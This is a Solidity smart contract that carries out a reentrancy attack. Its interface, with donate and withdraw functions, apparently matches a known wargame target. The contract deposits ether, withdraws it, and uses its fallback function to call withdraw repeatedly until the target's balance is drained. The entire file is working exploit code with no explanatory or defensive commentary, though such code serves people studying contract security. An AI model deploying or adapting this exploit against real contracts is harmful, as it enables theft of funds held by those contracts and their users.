// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ObContract {
  function withdraw(uint256 _amount) external;

  function donate(address _to) external payable;
}

contract Reentrancy {
  uint256 stepAmount;
  ObContract exploitInstance;

  constructor(uint256 _stepAmount, address _exploitAddress) {
    stepAmount = _stepAmount;
    exploitInstance = ObContract(_exploitAddress);
  }

  function startReentrancy() external payable {
    require(msg.value >= stepAmount, "Not enough wei to perform the exploit");
    exploitInstance.donate{ value: msg.value }(address(this));
    exploitInstance.withdraw(msg.value);
  }

  fallback() external payable {
    require(
      msg.sender == address(exploitInstance),
      "Caller is not the exploit instance"
    );
    if (address(exploitInstance).balance >= stepAmount) {
      exploitInstance.withdraw(stepAmount);
    }
  }

  receive() external payable {}
}
